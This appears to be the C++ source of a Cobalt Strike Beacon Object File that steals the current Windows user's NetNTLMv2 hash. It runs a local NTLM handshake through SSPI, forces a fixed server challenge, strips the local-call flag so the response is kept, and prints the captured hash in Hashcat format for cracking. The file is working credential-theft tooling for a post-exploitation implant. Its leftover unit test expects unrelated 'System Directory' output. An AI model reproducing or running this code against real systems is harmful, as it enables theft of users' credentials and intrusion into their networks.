#include <Windows.h>
#include "base\helpers.h"
#include "capturenetntlm.h"
#include "bofoutput.h"


#ifdef _DEBUG
	#undef DECLSPEC_IMPORT
	#define DECLSPEC_IMPORT
	#include "base\mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "sleepmask.h"

BOF_Buffer buffer = {0};

void SetPredefinedChallenge(UCHAR challenge[MSV1_0_CHALLENGE_LENGTH])
{
    const UCHAR predefinedChallenge[] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88};

    memcpy(challenge, predefinedChallenge, MSV1_0_CHALLENGE_LENGTH);
}

BOOL GetNTLMChallengeAndResponse()
{
	CHAR szDomainName[256 + 1] = "";
	CHAR szUserName[256 + 1] = "";
	CHAR ntlmsp_name[] = "NTLM";
	UCHAR bServerChallenge[MSV1_0_CHALLENGE_LENGTH];
	PNTLMv2_RESPONSE pNtChallengeResponse = NULL;
	PNTLMv2_CLIENT_CHALLENGE pClientChallenge = NULL;
	DWORD dwClientChallengeSize = 0;

	CredHandle hInboundCred;
	CredHandle hOutboundCred;
	TimeStamp InboundLifetime;
	TimeStamp OutboundLifetime;

	DWORD status = AcquireCredentialsHandleA(
		NULL,
		ntlmsp_name,
		SECPKG_CRED_OUTBOUND,
		NULL,
		NULL,
		NULL,
		NULL,
		&hOutboundCred,
		&OutboundLifetime
	);
	if (status != 0)
		return FALSE;

	status = AcquireCredentialsHandleA(
		NULL,
		ntlmsp_name,
		SECPKG_CRED_INBOUND,
		NULL,
		NULL,
		NULL,
		NULL,
		&hInboundCred,
		&InboundLifetime
	);
	if (status != 0)
		return FALSE;

	SecBufferDesc OutboundNegotiateBuffDesc;
	SecBuffer NegotiateSecBuff;
	OutboundNegotiateBuffDesc.ulVersion = 0;
	OutboundNegotiateBuffDesc.cBuffers = 1;
	OutboundNegotiateBuffDesc.pBuffers = &NegotiateSecBuff;

	NegotiateSecBuff.cbBuffer = 0;
	NegotiateSecBuff.BufferType = SECBUFFER_TOKEN;
	NegotiateSecBuff.pvBuffer = NULL;

	SecBufferDesc OutboundChallengeBuffDesc;
	SecBuffer ChallengeSecBuff;
	OutboundChallengeBuffDesc.ulVersion = 0;
	OutboundChallengeBuffDesc.cBuffers = 1;
	OutboundChallengeBuffDesc.pBuffers = &ChallengeSecBuff;

	ChallengeSecBuff.cbBuffer = 0;
	ChallengeSecBuff.BufferType = SECBUFFER_TOKEN;
	ChallengeSecBuff.pvBuffer = NULL;

	SecBufferDesc OutboundAuthenticateBuffDesc;
	SecBuffer AuthenticateSecBuff;
	OutboundAuthenticateBuffDesc.ulVersion = 0;
	OutboundAuthenticateBuffDesc.cBuffers = 1;
	OutboundAuthenticateBuffDesc.pBuffers = &AuthenticateSecBuff;

	AuthenticateSecBuff.cbBuffer = 0;
	AuthenticateSecBuff.BufferType = SECBUFFER_TOKEN;
	AuthenticateSecBuff.pvBuffer = NULL;

	CtxtHandle OutboundContextHandle = { 0 };
	ULONG OutboundContextAttributes = 0;
	CtxtHandle ClientContextHandle = { 0 };
	ULONG InboundContextAttributes = 0;

	// Setup the client security context
	status = InitializeSecurityContextA(
		&hOutboundCred,
		NULL,
		NULL,
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
		0,
		SECURITY_NATIVE_DREP,
		NULL,
		0,
		&OutboundContextHandle,
		&OutboundNegotiateBuffDesc,
		&OutboundContextAttributes,
		&OutboundLifetime
	);
	if (status != SEC_I_CONTINUE_NEEDED)
		return FALSE;

	NEGOTIATE_MESSAGE* negotiate = (NEGOTIATE_MESSAGE*)OutboundNegotiateBuffDesc.pBuffers[0].pvBuffer;

	status = AcceptSecurityContext(
		&hInboundCred,
		NULL,
		&OutboundNegotiateBuffDesc,
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
		SECURITY_NATIVE_DREP,
		&ClientContextHandle,
		&OutboundChallengeBuffDesc,
		&InboundContextAttributes,
		&InboundLifetime
	);
	if (status != SEC_I_CONTINUE_NEEDED)
		return FALSE;

	// client
	CHALLENGE_MESSAGE* challenge = (CHALLENGE_MESSAGE*)OutboundChallengeBuffDesc.pBuffers[0].pvBuffer;
	
	// Set the predefined challenge instead of the random one
	SetPredefinedChallenge(challenge->Challenge);

	// when local call, windows remove the ntlm response
	challenge->NegotiateFlags &= ~NTLMSSP_NEGOTIATE_LOCAL_CALL;

	status = InitializeSecurityContextA(
		&hOutboundCred,
		&OutboundContextHandle,
		NULL,
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE,
		0,
		SECURITY_NATIVE_DREP,
		&OutboundChallengeBuffDesc,
		0,
		&OutboundContextHandle,
		&OutboundAuthenticateBuffDesc,
		&OutboundContextAttributes,
		&OutboundLifetime
	);

	if (status != 0)
		return FALSE;

	AUTHENTICATE_MESSAGE* authenticate = (AUTHENTICATE_MESSAGE*)OutboundAuthenticateBuffDesc.pBuffers[0].pvBuffer;

	// Get domain name
	memcpy(szDomainName, ((PBYTE)authenticate + authenticate->DomainName.Offset), authenticate->DomainName.Length);
    szDomainName[authenticate->DomainName.Length] = 0;

	// Get username
    memcpy(szUserName, ((PBYTE)authenticate + authenticate->UserName.Offset), authenticate->UserName.Length);
    szUserName[authenticate->UserName.Length] = 0;
	
	// Get the Server challenge
	memcpy(bServerChallenge, challenge->Challenge, MSV1_0_CHALLENGE_LENGTH);

	// Get the Challenge response
	pNtChallengeResponse = (PNTLMv2_RESPONSE)((ULONG_PTR)authenticate + authenticate->NtChallengeResponse.Offset);

	pClientChallenge = &(pNtChallengeResponse->Challenge);
	dwClientChallengeSize = authenticate->NtChallengeResponse.Length - 16;

	// Print output in Hashcat Format: username:domain:ServerChallenge:response:blob
	BofPrintf(&buffer, "ntlmv2_hash:\n");
	BofPrintf(&buffer, "  - %ls::%ls:", szUserName, szDomainName);
	
	// ServerChallenge
    for (int i = 0; i < sizeof(bServerChallenge); i++)
	{
		BofPrintf(&buffer, "%02x", bServerChallenge[i]);
    }

	BofPrintf(&buffer, ":");

    // response
    for (int i = 0; i < sizeof(pNtChallengeResponse->Response); i++)
	{
		BofPrintf(&buffer, "%02x", pNtChallengeResponse->Response[i]);
    }

	BofPrintf(&buffer, ":");

    // blob
    for (DWORD i = 0; i < dwClientChallengeSize; i++)
	{
		BofPrintf(&buffer, "%02x", *((PBYTE)(&(pNtChallengeResponse->Challenge)) + i));  // 16 
    }

	BofPrintf(&buffer, "\n");
	
	return TRUE;
}


void go(char* args, int len)
{
	BOOL result = FALSE;

	if (!BofBufferInit(&buffer))
    {
        goto cleanup;
    }

	result = GetNTLMChallengeAndResponse();
	
cleanup:
	if (!result)
	{
		BeaconPrintf(CALLBACK_ERROR,"\nFailed to capture NetNTLM hash.\n");
    }

	BofBufferFree(&buffer);
}
} // end extern "C"


// Define a main function for the debug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[])
{
	bof::runMocked<>(go);

	return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {
	std::vector<bof::output::OutputEntry> got =
		bof::runMocked<>(go);
	std::vector<bof::output::OutputEntry> expected = {
		{CALLBACK_OUTPUT, "System Directory: C:\\Windows\\system32"}
	};
	// It is possible to compare the OutputEntry vectors, like directly
	// ASSERT_EQ(expected, got);
	// However, in this case, we want to compare the output, ignoring the case.
	ASSERT_EQ(expected.size(), got.size());
	ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif